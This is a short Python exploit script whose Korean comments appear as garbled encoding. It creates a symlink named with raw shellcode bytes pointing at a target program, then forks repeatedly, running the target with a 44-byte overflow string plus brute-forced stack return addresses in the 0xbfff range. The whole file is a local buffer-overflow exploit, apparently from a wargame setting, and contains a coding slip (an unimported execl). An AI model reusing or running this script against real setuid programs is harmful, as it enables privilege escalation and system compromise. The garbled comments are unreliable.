# �������� ������ ���� ���ϸ��� ����. �װ��� Ȱ��
# \xef�� ���� �ʴ� ���ڵ带 ����ؾ���. \x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3

import sys,os

TARGET=os.getcwd()+"/"+sys.argv[1]
SYM="\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"

if not os.path.islink(SYM):
    os.symlink(TARGET,SYM)

for h in range(0xff,0x00,-1):
    for l in range(0xff,0x00,-1):
        PAYLOAD="a"*44+chr(l)+chr(h)+"\xff\xbf"
        pid = os.fork()
        if pid == 0:
            execl(SYM,SYM,PAYLOAD)
        else:
            os.waitpid(pid,0)
